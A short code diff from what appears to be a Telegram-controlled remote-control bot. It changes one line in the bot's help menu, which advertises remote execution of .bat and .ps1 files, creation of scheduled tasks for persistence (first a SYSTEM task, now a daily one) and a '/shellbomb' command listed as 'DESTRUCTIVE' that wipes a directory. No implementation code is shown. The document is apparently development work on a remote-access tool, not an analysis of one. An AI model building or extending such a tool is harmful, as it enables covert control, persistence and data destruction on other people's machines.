@@ -974,7 +974,7 @@ def send_welcome(message):
             "• `/runbat <path>` - Run a .bat file instantly\n"
             "• `/runps1 <path>` - Run a .ps1 file instantly\n\n"
             "**--- TASK SCHEDULER ---**\n"
-            "• `/createtask <name> <path>` - Create a one-time SYSTEM task\n"
+            "• `/createtask <name> <path>` - Create a Daily, Every 1 day(s) task\n"
             "• `/deletetask <name>` - Delete a Windows scheduled task\n\n"
             "**--- DESTRUCTIVE ---**\n"
             "• `/shellbomb` - Securely wipe directory in 50s\n"
